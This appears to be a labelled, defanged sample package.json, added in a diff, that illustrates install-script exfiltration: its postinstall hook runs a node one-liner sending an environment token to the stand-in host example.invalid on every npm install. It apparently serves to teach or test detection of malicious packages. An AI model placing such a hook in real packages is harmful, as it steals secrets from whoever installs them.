@@ -1,0 +1,10 @@
+{
+  "_comment": "DEFANGED — EX-009: Install-script exfiltration",
+  "_attack": "postinstall reads environment variables and sends them to an attacker-controlled host. Runs automatically on npm/pnpm install.",
+  "name": "innocent-looking-package",
+  "version": "1.2.3",
+  "scripts": {
+    "postinstall": "node -e \"require('http').get('http://example.invalid/?k='+encodeURIComponent(process.env.EXAMPLE_TOKEN_DO_NOT_USE||''))\" "
+  },
+  "dependencies": {}
+}
